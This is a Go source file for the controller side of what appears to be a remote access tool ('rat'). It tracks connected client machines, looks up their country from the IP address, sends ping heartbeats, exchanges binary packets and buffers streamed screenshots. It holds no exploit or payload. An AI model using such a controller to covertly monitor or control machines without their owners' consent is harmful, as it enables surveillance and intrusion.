package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"rat/common"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/websocket"
)

const (
	Windows = "Windows"
	MacOS   = "macOS"
	Linux   = "Linux"
)

type listenerMap map[common.PacketHeader]*websocket.Conn

type Monitor struct {
	ID     int `json:"id"`
	Width  int `json:"w"`
	Height int `json:"h"`
}

type Client struct {
	net.Conn
	common.Writer
	common.Reader

	Id int

	common.Computer
	Country     string
	CountryCode string

	Ping struct {
		Start   time.Time
		Current int
	}

	Screen struct {
		Streaming bool
		Buffer    []byte
	}

	Queue chan OutgoingPacket

	Listeners listenerMap

	Monitors []Monitor
}

func NewClient(conn net.Conn) *Client {
	client := new(Client)

	client.Queue = make(chan OutgoingPacket)

	client.Id = int(rand.Int31())
	client.Computer = common.Computer{}
	client.Conn = conn
	client.Country, client.CountryCode = GetCountry(client.GetIP())
	client.Listeners = make(map[common.PacketHeader]*websocket.Conn)
	client.Monitors = make([]Monitor, 0)

	return client
}

func (c *Client) GetDisplayHost() string {
	return c.Conn.RemoteAddr().String()
}

func (c *Client) GetIP() string {
	return strings.Split(c.Conn.RemoteAddr().String(), ":")[0]
}

func (c *Client) GetFlagName() string {
	name := strings.ToLower(c.CountryCode)

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "local"
		default:
			name = "unknown"
		}
	}

	return name
}

func (c *Client) GetCountry() string {
	name := c.Country

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "Local Network"
		default:
			name = "Unknown"
		}
	}

	return name
}

func (c *Client) GetPing() string {
	return strconv.Itoa(c.Ping.Current) + " ms"
}

func (client *Client) PacketReader() {
	for {
		header, err := client.ReadHeader()

		if err != nil {
			fmt.Println(err.Error())
			remove(client)
			break
		}

		packet := GetIncomingPacket(header)
		err = packet.Read(client)

		if err != nil {
			fmt.Println(err.Error())
			remove(client)
			break
		}
	}
}

func (client *Client) Heartbeat() {
	for {
		time.Sleep(time.Second * 2)
		client.Queue <- Ping{}
	}
}

func (client *Client) PacketQueue() {
	for {
		packet := <-client.Queue
		client.WritePacket(packet)
	}
}

func (c *Client) WriteInt(i int) error {
	i32 := int32(i)
	return binary.Write(c, common.ByteOrder, &i32)
}

func (c *Client) WriteFloat(f float32) error {
	return binary.Write(c, common.ByteOrder, &f)
}

func (c *Client) WriteBool(b bool) error {
	var byt byte

	switch b {
	case true:
		byt = 1
	default:
		byt = 0
	}
	data := make([]byte, 1)
	data[0] = byt

	_, err := c.Write(data)

	return err
}

func (c *Client) WriteString(s string) error {
	err := c.WriteInt(len(s))

	if err != nil {
		return err
	}

	c.Conn.Write([]byte(s))
	return err
}

func (c *Client) ReadString() (string, error) {
	n, err := c.ReadInt()

	if err != nil {
		fmt.Println(err.Error())
		return "", err
	}

	buf := make([]byte, n)
	io.ReadFull(c, buf)

	s := string(buf)

	return s, err
}

func (c *Client) ReadInt() (int, error) {
	var n int32
	err := binary.Read(c, common.ByteOrder, &n)

	return int(n), err
}

func (c *Client) ReadFloat() (float32, error) {
	var f float32
	err := binary.Read(c, common.ByteOrder, &f)
	return f, err
}

func (c *Client) ReadBool() (bool, error) {
	b := make([]byte, 1)
	_, err := c.Read(b)
	return b[0] == 1, err
}

func (c *Client) ReadHeader() (common.PacketHeader, error) {
	var h common.PacketHeader
	err := binary.Read(c, common.ByteOrder, &h)

	return h, err
}

func (c *Client) WriteHeader(header common.PacketHeader) error {
	return binary.Write(c.Conn, common.ByteOrder, header)
}

func (c *Client) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.GetHeader())

	if err != nil {
		return err
	}

	return packet.Write(c)
}

// GetEncodedScreen returns a base64 encoded version of the most recent screenshot
func (c *Client) GetEncodedScreen() string {
	return base64.StdEncoding.EncodeToString(c.Screen.Buffer)
}
